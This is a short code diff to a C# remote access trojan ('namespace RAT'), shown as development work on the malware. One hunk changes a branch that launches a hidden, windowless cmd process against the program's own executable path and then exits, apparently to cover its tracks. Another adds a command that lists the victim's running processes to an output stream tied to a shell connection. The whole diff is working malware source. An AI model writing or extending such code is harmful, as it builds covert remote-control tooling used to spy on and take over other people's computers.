@@ -226,12 +226,20 @@ namespace RAT
                                        Application.ExecutablePath;
                         Info.WindowStyle = ProcessWindowStyle.Hidden;
                         Info.CreateNoWindow = true;
-                        Info.FileName = "cmd.exe";
+                        Info.FileName = "cmd";
                         Process.Start(Info);
                         CloseShell();
-                        Application.Exit();
+                        Environment.Exit(0);
                     }
 
+                    break;
+                case RatAction.LIST_PROCESSES:
+                    Log("LIST_PROCESSES MODE");
+                    Process[] allProcesses = Process.GetProcesses();
+                    foreach (Process process in allProcesses)
+                    {
+                        OutStream.WriteLine("#{0} \t{1} ", process.Id, process.ProcessName);
+                    }
                     break;
                 case RatAction.QUIT:
                     OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
